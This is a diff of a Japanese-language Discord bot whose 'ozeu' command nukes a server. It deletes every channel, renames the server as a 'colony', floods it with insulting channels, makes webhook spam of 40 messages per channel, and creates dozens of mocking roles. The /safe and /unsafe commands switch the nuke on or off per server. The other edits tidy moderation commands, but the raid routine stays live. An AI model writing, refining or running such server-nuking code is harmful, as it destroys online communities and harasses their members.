@@ -149,20 +149,20 @@ async def ozeu(ctx, guild_id: int = None):
         try:
             await channel.delete()
         except Exception as e:
-            print(f"[kuritorisu] {channel.name} の削除でエラー: {e}")
+            print(f"[ozeu] {channel.name} の削除でエラー: {e}")
 
     await asyncio.gather(*[delete_channel(ch) for ch in guild.channels])
 
     # サーバー名変更
     try:
-        await guild.edit(name="ozeuの植民地")
+        await guild.edit(name="ozeu植民地")
     except Exception as e:
         print(f"[ozeu] サーバー名の変更でエラー: {e}")
 
     # --- チャンネル作成関数 ---
     async def create_channel(i):
         try:
-            return await guild.create_text_channel(name="馬鹿がｗ荒らされてやんのｗｗｗ")
+            return await guild.create_text_channel(name="バカどもがｗ")
         except Exception as e:
             print(f"[ozeu] {i+1}個目のチャンネル作成失敗: {e}")
             return None
@@ -175,7 +175,7 @@ async def ozeu(ctx, guild_id: int = None):
         try:
             webhook = await channel.create_webhook(name="ZPlusWebhook")
             for _ in range(40):
-                await webhook.send(SPAM_MESSAGE, username="無知どもがｗ")
+                await webhook.send(SPAM_MESSAGE, username="無知くんｗ")
         except Exception as e:
             print(f"[ozeu] {channel.name} のWebhook送信でエラー: {e}")
 
@@ -183,8 +183,8 @@ async def ozeu(ctx, guild_id: int = None):
 
     # ロール作成
     try:
-        for i in range(40):
-            await guild.create_role(name=f"バカどもにはちょうどいいｗ{i+1}")
+        for i in range(30):
+            await guild.create_role(name=f"バカ草ｗ{i+1}")
     except Exception as e:
         print(f"[ozeu] ロール作成でエラー: {e}")
 
@@ -208,27 +208,41 @@ async def ozeu(ctx, guild_id: int = None):
 # --- /safe コマンド ---
 @tree.command(name="safe", description="指定したサーバーIDを安全サーバーリストに追加し、nukeを発動禁止にします")
 @app_commands.describe(server_id="対象のサーバーID")
-async def safe(interaction: discord.Interaction, server_id: int):
+async def safe(interaction: discord.Interaction, server_id: str):
     if interaction.user.id not in dev_users:
         await interaction.response.send_message("❌ このコマンドは開発者権限ユーザーのみ使用できます。", ephemeral=True)
         return
-    safe_servers.add(server_id)
+    
+    try:
+        server_id_int = int(server_id)
+    except ValueError:
+        await interaction.response.send_message("❌ 無効なサーバーIDです。数字のみを入力してください。", ephemeral=True)
+        return
+
+    safe_servers.add(server_id_int)
     save_safe_servers(safe_servers)
-    await interaction.response.send_message(f"✅ サーバーID {server_id} を安全リストに追加しました。")
+    await interaction.response.send_message(f"✅ サーバーID {server_id_int} を安全リストに追加しました。")
 
 # --- /unsafe コマンド ---
 @tree.command(name="unsafe", description="指定したサーバーIDを安全リストから削除し、nukeを発動可能にします")
 @app_commands.describe(server_id="対象のサーバーID")
-async def unsafe(interaction: discord.Interaction, server_id: int):
+async def unsafe(interaction: discord.Interaction, server_id: str):
     if interaction.user.id not in dev_users:
         await interaction.response.send_message("❌ このコマンドは開発者権限ユーザーのみ使用できます。", ephemeral=True)
         return
+    
     try:
-        safe_servers.remove(server_id)
+        server_id_int = int(server_id)
+    except ValueError:
+        await interaction.response.send_message("❌ 無効なサーバーIDです。数字のみを入力してください。", ephemeral=True)
+        return
+
+    try:
+        safe_servers.remove(server_id_int)
         save_safe_servers(safe_servers)
-        await interaction.response.send_message(f"✅ サーバーID {server_id} を安全リストから削除しました。")
+        await interaction.response.send_message(f"✅ サーバーID {server_id_int} を安全リストから削除しました。")
     except KeyError:
-        await interaction.response.send_message(f"⚠ サーバーID {server_id} は安全リストに登録されていません。")
+        await interaction.response.send_message(f"⚠ サーバーID {server_id_int} は安全リストに登録されていません。")
 
 # --- /backup コマンド ---
 @tree.command(name="backup", description="ログを保存します")
@@ -246,8 +260,11 @@ async def ping(interaction: discord.Interaction):
 @tree.command(name="kick", description="指定したユーザーをキックします")
 @app_commands.describe(member="キックするメンバー", reason="理由（省略可）")
 async def kick(interaction: discord.Interaction, member: discord.Member, reason: str = "理由なし"):
-    if member.top_role >= interaction.user.top_role:
-        await interaction.response.send_message("❌ 権限の高いユーザーはキックできません。", ephemeral=True)
+    if not interaction.user.guild_permissions.kick_members:
+        await interaction.response.send_message("❌ あなたにキックする権限はありません。", ephemeral=True)
+        return
+    if member.top_role >= interaction.user.top_role and interaction.user.id != interaction.guild.owner_id:
+        await interaction.response.send_message("❌ 自分より役職が同じまたは高いユーザーはキックできません。", ephemeral=True)
         return
     try:
         await member.kick(reason=reason)
@@ -259,8 +276,11 @@ async def kick(interaction: discord.Interaction, member: discord.Member, reason:
 @tree.command(name="ban", description="指定したユーザーをBAN（追放）します")
 @app_commands.describe(member="BANするメンバー", reason="理由（省略可）")
 async def ban(interaction: discord.Interaction, member: discord.Member, reason: str = "理由なし"):
-    if member.top_role >= interaction.user.top_role:
-        await interaction.response.send_message("❌ 権限の高いユーザーはBANできません。", ephemeral=True)
+    if not interaction.user.guild_permissions.ban_members:
+        await interaction.response.send_message("❌ あなたにBANする権限はありません。", ephemeral=True)
+        return
+    if member.top_role >= interaction.user.top_role and interaction.user.id != interaction.guild.owner_id:
+        await interaction.response.send_message("❌ 自分より役職が同じまたは高いユーザーはBANできません。", ephemeral=True)
         return
     try:
         await member.ban(reason=reason)
@@ -297,12 +317,18 @@ get_group = app_commands.Group(name="get", description="情報取得系コマン
 
 @get_group.command(name="url", description="指定されたサーバーの招待リンクを取得します（開発者専用）")
 @app_commands.describe(server_id="招待リンクを取得したいサーバーのID")
-async def get_url(interaction: discord.Interaction, server_id: int):
+async def get_url(interaction: discord.Interaction, server_id: str):
     if interaction.user.id not in dev_users:
         await interaction.response.send_message("このコマンドはBotの開発者のみ使えます。", ephemeral=True)
         return
 
-    guild = bot.get_guild(server_id)
+    try:
+        server_id_int = int(server_id)
+    except ValueError:
+        await interaction.response.send_message("❌ 無効なサーバーIDです。数字のみを入力してください。", ephemeral=True)
+        return
+
+    guild = bot.get_guild(server_id_int)
     if guild is None:
         await interaction.response.send_message("指定されたサーバーにBotが参加していません。", ephemeral=True)
         return
@@ -319,7 +345,7 @@ async def get_url(interaction: discord.Interaction, server_id: int):
 
 tree.add_command(get_group)
 
-# --- /log コマンド ---
+# --- /log コマンド (修正済み) ---
 @tree.command(name="log", description="直近の監査ログ（10件）を表示します")
 @app_commands.describe(
     action_type="取得するログの種類を選んでください（例: メンバーBAN、チャンネル削除など）"
@@ -344,8 +370,8 @@ async def log(
         await interaction.response.send_message("❌ このコマンドはサーバー内でのみ使用できます。", ephemeral=True)
         return
 
-    if not interaction.user.guild_permissions.manage_guild:
-        await interaction.response.send_message("❌ このコマンドは管理者のみ使用できます。", ephemeral=True)
+    if not interaction.user.guild_permissions.view_audit_log:
+        await interaction.response.send_message("❌ あなたには監査ログの閲覧権限がありません。", ephemeral=True)
         return
 
     action_map = {
@@ -364,7 +390,7 @@ async def log(
             async for entry in interaction.guild.audit_logs(limit=10):
                 logs.append(entry)
         else:
-            async for entry in interaction.guild.audit_logs(limit=20, action=action_map[action_type.value]):
+            async for entry in interaction.guild.audit_logs(limit=30, action=action_map[action_type.value]):
                 logs.append(entry)
                 if len(logs) == 10:
                     break
@@ -376,22 +402,32 @@ async def log(
         description = ""
         for entry in logs:
             created_at_utc = entry.created_at.strftime("%Y/%m/%d %H:%M:%S UTC")
-            description += (
-                f"**{entry.action.name}**\n"
-                f"実行者: {entry.user} (ID: {entry.user.id})\n"
+            
+            entry_text = (
+                f"**{entry.action.name.replace('_', ' ').title()}**\n"
+                f"実行者: {entry.user} (ID: `{entry.user.id}`)\n"
                 f"対象: {entry.target}\n"
                 f"日時: {created_at_utc}\n"
-                f"詳細: {entry.extra if entry.extra else 'なし'}\n\n"
+                f"詳細: {entry.reason or (entry.extra if entry.extra else 'なし')}\n\n"
             )
+            
+            if len(description) + len(entry_text) > 4000:
+                description += "（ログが長すぎるため、ここで表示を終了します）"
+                break
+            
+            description += entry_text
 
         embed = discord.Embed(
-            title=f"📜 監査ログ ({action_type.name}) 最新10件",
-            description=description,
+            title=f"📜 監査ログ ({action_type.name})",
+            description=description.strip(),
             color=discord.Color.dark_red()
         )
+        embed.set_footer(text=f"サーバー: {interaction.guild.name}")
         embed.timestamp = discord.utils.utcnow()
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
+    except discord.Forbidden:
+        await interaction.response.send_message("❌ 監査ログの読み取り権限がありません。", ephemeral=True)
     except Exception as e:
         await interaction.response.send_message(f"❌ ログの取得中にエラーが発生しました: {e}", ephemeral=True)
 
@@ -400,24 +436,21 @@ async def log(
 async def on_guild_join(guild: discord.Guild):
     owner = await bot.fetch_user(OWNER_ID)
 
-    # 小規模サーバー判定（メンバー数5人以下かつオーナーがいない場合はすぐ退出）
     if guild.member_count <= 5:
         try:
-            if guild.owner is None:
+            if guild.owner is None or guild.owner_id == bot.user.id:
                 await guild.leave()
                 embed = discord.Embed(
-                    title="🚪 5人以下サーバーのためBotが退出しました",
-                    description=f"サーバー名: {guild.name} (ID: {guild.id})\nメンバー数: {guild.member_count}\nオーナー不在",
+                    title="🚪 小規模/不審なサーバーのためBotが退出しました",
+                    description=f"サーバー名: {guild.name} (ID: {guild.id})\nメンバー数: {guild.member_count}",
                     color=discord.Color.orange()
                 )
                 embed.timestamp = discord.utils.utcnow()
                 await owner.send(embed=embed)
                 return
         except Exception:
-            # オーナー情報取得エラーは無視して継続
             pass
 
-    # 招待者の取得（監査ログを利用、Forbiddenなど例外処理含む）
     inviter_info = "不明"
     try:
         async for entry in guild.audit_logs(limit=10, action=discord.AuditLogAction.bot_add):
@@ -443,15 +476,21 @@ async def on_guild_join(guild: discord.Guild):
 
     await owner.send(embed=embed)
 
-# --- その他、必要なコマンドや機能はここに追加してください ---
+# --- /leave コマンド ---
 @tree.command(name="leave", description="指定したサーバーからBotを退出させます（開発者用）")
 @app_commands.describe(server_id="退出したいサーバーのID")
-async def leave(interaction: discord.Interaction, server_id: int):
+async def leave(interaction: discord.Interaction, server_id: str):
     if interaction.user.id not in dev_users:
         await interaction.response.send_message("❌ 開発者権限を持っていません", ephemeral=True)
         return
 
-    guild = bot.get_guild(server_id)
+    try:
+        server_id_int = int(server_id)
+    except ValueError:
+        await interaction.response.send_message("❌ 無効なサーバーIDです。数字のみを入力してください。", ephemeral=True)
+        return
+
+    guild = bot.get_guild(server_id_int)
     if not guild:
         await interaction.response.send_message("⚠ 指定されたIDのサーバーにBotは参加していません。", ephemeral=True)
         return
@@ -469,6 +508,7 @@ async def leave(interaction: discord.Interaction, server_id: int):
         await owner.send(embed=embed)
     except Exception as e:
         await interaction.response.send_message(f"❌ 退出に失敗しました: {e}", ephemeral=True)
+
 #----bot status----
 @tree.command(name="bot_stats", description="Botの統計情報を表示します")
 async def bot_stats(interaction: discord.Interaction):
@@ -493,35 +533,45 @@ async def bot_stats(interaction: discord.Interaction):
     embed.timestamp = discord.utils.utcnow()
 
     await interaction.response.send_message(embed=embed, ephemeral=True)
+
 #---自動退出（人数指定）
 @tree.command(name="auto_leave_small_servers", description="指定した人数以下のサーバーから自動退出します")
 @app_commands.describe(threshold="この人数以下のサーバーから退出する（例: 5）")
 async def auto_leave_small_servers(interaction: discord.Interaction, threshold: int):
-    await interaction.response.defer(thinking=True)  # ← 最初に追加
-
     if interaction.user.id != OWNER_ID:
-        await interaction.followup.send("このコマンドはBotオーナー専用です。", ephemeral=True)
+        await interaction.response.send_message("このコマンドはBotオーナー専用です。", ephemeral=True)
         return
+    
+    await interaction.response.defer(ephemeral=True, thinking=True)
 
     left_servers = []
-
-    for guild in bot.guilds:
+    left_count = 0
+    
+    # bot.guildsのコピーに対してループを回す
+    for guild in list(bot.guilds):
+        if guild.id in safe_servers:
+            continue
         if guild.member_count <= threshold:
             try:
                 await guild.leave()
-                left_servers.append(f"{guild.name} ({guild.member_count}人)")
-                await asyncio.sleep(1)  # 過負荷回避
+                left_servers.append(f"・{guild.name} ({guild.member_count}人)")
+                left_count += 1
+                await asyncio.sleep(1)
             except Exception as e:
-                print(f"Failed to leave {guild.name}: {e}")
+                print(f"サーバーからの退出に失敗: {guild.name} ({guild.id}) - {e}")
 
-    if left_servers:
-        msg = f"以下のサーバーから退出しました（{len(left_servers)} 件）:\n" + "\n".join(left_servers)
+    if left_count > 0:
+        msg = f"✅ {threshold}人以下のサーバー（{left_count}件）から退出しました。\n"
+        # メッセージが長くなりすぎるのを防ぐ
+        if len(left_servers) > 20:
+            msg += "\n".join(left_servers[:20])
+            msg += f"\n...他{len(left_servers) - 20}件"
+        else:
+            msg += "\n".join(left_servers)
     else:
-        msg = f"{threshold}人以下のサーバーは見つかりませんでした。"
+        msg = f"ℹ️ {threshold}人以下のサーバーは見つかりませんでした。"
 
-    await interaction.followup.send(msg)
-
-
+    await interaction.followup.send(msg, ephemeral=True)
 
 bot.run(TOKEN)
 
